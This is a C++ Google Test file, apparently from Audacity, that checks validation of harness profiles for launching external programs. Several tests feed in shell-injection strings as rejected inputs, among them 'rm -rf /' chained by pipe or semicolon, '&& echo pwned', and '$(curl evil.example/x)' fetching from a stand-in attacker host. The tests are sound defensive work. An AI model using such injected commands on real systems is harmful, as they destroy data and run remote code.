/*
* Audacity: A Digital Audio Editor
*/

#include <gtest/gtest.h>

#include "internal/harnessprofile.h"

using namespace au::toolkit;

TEST(HarnessProfileTests, APlainProfileIsValid)
{
    HarnessProfile profile;
    profile.name = QStringLiteral("Play a note");
    profile.executablePath = QStringLiteral("/usr/bin/aplay");
    profile.arguments = { QStringLiteral("test.wav") };

    EXPECT_TRUE(validateHarnessProfile(profile).isEmpty());
}

TEST(HarnessProfileTests, APipeInAnArgumentIsRejected)
{
    HarnessProfile profile;
    profile.name = QStringLiteral("Suspicious");
    profile.executablePath = QStringLiteral("/usr/bin/aplay");
    profile.arguments = { QStringLiteral("test.wav | rm -rf /") };

    EXPECT_FALSE(validateHarnessProfile(profile).isEmpty());
}

TEST(HarnessProfileTests, ACommandSubstitutionInTheExecutableIsRejected)
{
    HarnessProfile profile;
    profile.name = QStringLiteral("Suspicious");
    profile.executablePath = QStringLiteral("$(curl evil.example/x)");

    EXPECT_FALSE(validateHarnessProfile(profile).isEmpty());
}

TEST(HarnessProfileTests, ASemicolonChainIsRejected)
{
    EXPECT_TRUE(argumentLooksLikeShell(QStringLiteral("value; rm -rf /")));
}

TEST(HarnessProfileTests, AnAmpersandChainIsRejected)
{
    EXPECT_TRUE(argumentLooksLikeShell(QStringLiteral("value && echo pwned")));
}

TEST(HarnessProfileTests, AnOrdinaryValueIsNotFlagged)
{
    EXPECT_FALSE(argumentLooksLikeShell(QStringLiteral("--sample-rate=44100")));
}

TEST(HarnessProfileTests, AMissingNameIsRejected)
{
    HarnessProfile profile;
    profile.executablePath = QStringLiteral("/usr/bin/aplay");

    EXPECT_FALSE(validateHarnessProfile(profile).isEmpty());
}

TEST(HarnessProfileTests, RoundTripThroughVariantMapPreservesFields)
{
    HarnessProfile profile;
    profile.name = QStringLiteral("Round trip");
    profile.executablePath = QStringLiteral("/usr/bin/aplay");
    profile.arguments = { QStringLiteral("a"), QStringLiteral("b") };
    profile.workingDirectory = QStringLiteral("/tmp");
    profile.environmentKeys = { QStringLiteral("PATH") };

    const HarnessProfile roundTripped = harnessProfileFromVariantMap(harnessProfileToVariantMap(profile));

    EXPECT_EQ(roundTripped.name, profile.name);
    EXPECT_EQ(roundTripped.executablePath, profile.executablePath);
    EXPECT_EQ(roundTripped.arguments, profile.arguments);
    EXPECT_EQ(roundTripped.workingDirectory, profile.workingDirectory);
    EXPECT_EQ(roundTripped.environmentKeys, profile.environmentKeys);
}
